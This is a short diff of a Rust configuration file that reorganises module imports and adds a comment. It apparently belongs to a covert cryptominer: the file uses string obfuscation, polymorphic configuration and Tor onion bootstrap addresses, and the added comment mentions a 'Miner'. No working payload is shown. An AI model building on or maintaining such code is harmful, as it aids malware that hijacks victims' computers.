@@ -1,7 +1,7 @@
 use std::sync::Mutex;
 // use std::path::PathBuf;
-use crate::common::polymorph::MorphConfig;
-use crate::utils::paths::get_appdata_dir;
+use crate::security::polymorph::MorphConfig;
+use crate::helpers::paths::get_appdata_dir;
 use once_cell::sync::Lazy;
 use obfstr::obfstr;
 
@@ -25,6 +25,7 @@ pub const BOOTSTRAP_ONIONS: [&str; 3] = [
 
 // Dynamic Runtime Configuration
 pub static RUNTIME_CONFIG: Lazy<Mutex<MorphConfig>> = Lazy::new(|| {
+    // Linux Lite: Always Generate New (No Persistent Config for Miner)
     Mutex::new(MorphConfig::generate())
 });
 
